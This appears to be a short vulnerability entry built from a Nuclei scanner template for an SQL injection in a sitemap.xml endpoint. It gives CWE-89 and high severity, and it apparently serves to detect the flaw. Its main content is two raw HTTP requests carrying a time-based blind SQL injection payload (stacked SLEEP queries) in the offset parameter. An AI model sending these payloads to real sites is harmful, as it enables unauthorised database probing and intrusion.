# Nuclei Template: Sitemap - SQL Injection
**Template ID:** sitemap-sql-injection
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`sitemap-sql-injection.yaml`)

## Vulnerability Information & PoC

## Description
Sitemap is vulnerable to SQL Injection.

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(6)),1,2356)# HTTP/1.1
Host: {{Hostname}}

@timeout: 25s
POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)# HTTP/1.1
Host: {{Hostname}}
```

## References
- https://twitter.com/GodfatherOrwa/status/1647406811216072705?t=fbn0Eu34euKdrn4fL8UqfQ&s=19
